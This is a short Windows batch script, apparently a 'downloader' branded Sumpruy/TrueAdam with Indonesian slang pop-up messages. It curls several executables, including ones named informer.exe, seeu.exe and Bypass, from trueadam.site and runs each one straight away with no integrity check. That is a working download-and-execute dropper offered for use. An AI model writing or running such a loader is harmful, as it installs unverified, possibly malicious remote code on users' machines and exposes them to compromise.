@echo off
title Sumpruy Downloader Pro Max - TrueAdam
set "DL_DIR=C:\Sumpruy_Downloads"
mkdir "%DL_DIR%" 2>nul
cd /d "%DL_DIR%"

:: POP UP PERTAMA
powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Sumpruy downloader is now started mpruy tunggu aja.', 'Sumpruy Downloader', 'OK', 'Warning')}"

:: DAFTAR FILE + URL LENGKAP
set "FILES=StarDesk.exe informer.exe seeu.exe Bypass Noir.exe"

:: LOOPING DOWNLOAD + EKSEKUSI
for %%F in (%FILES%) do (
    echo.
    echo ========================================
    echo Downloading %%F dari https://trueadam.site/%%F ...
    echo ========================================
    
    if exist "%%F" del "%%F"
    
    curl -L -o "%%F" "https://trueadam.site/%%F" --silent --show-error
    
    if exist "%%F" (
        for %%Z in ("%%F") do (
            if %%~zZ LSS 1000 (
                echo ⚠️ File %%F terlalu kecil (%%~zZ bytes) - mungkin corrupt
                del "%%F"
                echo ❌ Gagal, file corrupt.
            ) else (
                echo ✅ %%F berhasil didownload (%%~zZ bytes)
                timeout /t 1 /nobreak >nul
                echo 🚀 Menjalankan %%F ...
                start "" "%%F"
            )
        )
    ) else (
        echo ❌ %%F gagal download. Coba ulang manual.
    )
)

:: POP UP KEDUA
powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Udeh selesuy mpruy downloadnya tinggal gas aje mok gue laper.', 'Sumpruy Downloader', 'OK', 'Information')}"

echo.
echo ========================================
echo Selesai! Cek folder C:\Sumpruy_Downloads
echo ========================================
pause
